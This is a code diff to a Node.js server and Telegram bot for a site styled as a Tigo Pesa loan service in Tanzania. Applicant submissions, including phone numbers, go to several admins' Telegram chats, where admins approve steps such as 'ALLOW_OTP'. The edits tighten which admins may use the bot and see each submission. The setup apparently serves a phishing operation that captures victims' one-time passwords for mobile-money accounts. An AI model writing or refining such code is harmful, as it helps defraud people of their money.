@@ -108,8 +108,8 @@ async function initBot() {
       const fullName = `${firstName} ${lastName}`.trim();
       const username = user.username ? `@${user.username}` : 'No username set';
       
-      let assignedCode = '01';
-      for (let i = 20; i >= 1; i--) {
+      let assignedCode = null;
+      for (let i = 1; i <= 20; i++) {
         const codeStr = String(i).padStart(2, '0');
         if (process.env[`ADMIN_${codeStr}`] === chatId) {
           assignedCode = codeStr;
@@ -117,9 +117,14 @@ async function initBot() {
         }
       }
 
-      // Main Admin (ADMIN_01) gets a completely distinct and unique link suffix indicator
-      const linkParam = (assignedCode === '01') ? 'main-admin' : assignedCode;
-      const uniqueIsolatedLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${linkParam}`;
+      if (!assignedCode) {
+        await bot.sendMessage(chatId, `❌ **Access Denied:** Your Chat ID (\`${chatId}\`) is not authorized as a designated admin.`, { 
+          parse_mode: 'Markdown' 
+        });
+        return;
+      }
+
+      const uniqueIsolatedLink = `https://tigo-pesa-loan-tanzania.onrender.com/?admin=${assignedCode}`;
 
       const userWelcomeInfo = 
         `🚨 **Unique Admin Link Registered Successfully!**\n\n` +
@@ -165,7 +170,17 @@ async function initBot() {
         };
       }
 
-      const chatTarget = session.adminChatId || String(query.message.chat.id) || process.env.ADMIN_01;
+      const callbackSenderChatId = String(query.message.chat.id);
+
+      if (session.adminChatId && session.adminChatId !== callbackSenderChatId) {
+        await bot.answerCallbackQuery(query.id, { 
+          text: '⚠️ Unauthorized: This submission belongs to a different admin channel.', 
+          show_alert: true 
+        }).catch(() => {});
+        return;
+      }
+
+      const chatTarget = session.adminChatId || callbackSenderChatId;
 
       switch (prefix) {
         case 'ALLOW_OTP':
@@ -222,11 +237,6 @@ app.post('/api/submit-application', (req, res) => {
 
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
-    }
-
-    // Map special main-admin string back to ADMIN_01 chat target
-    if (adminChatId === 'main-admin') {
-      adminChatId = '01';
     }
 
     if (!isValidTigoNumber(phone)) {
@@ -361,4 +371,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-    
+  
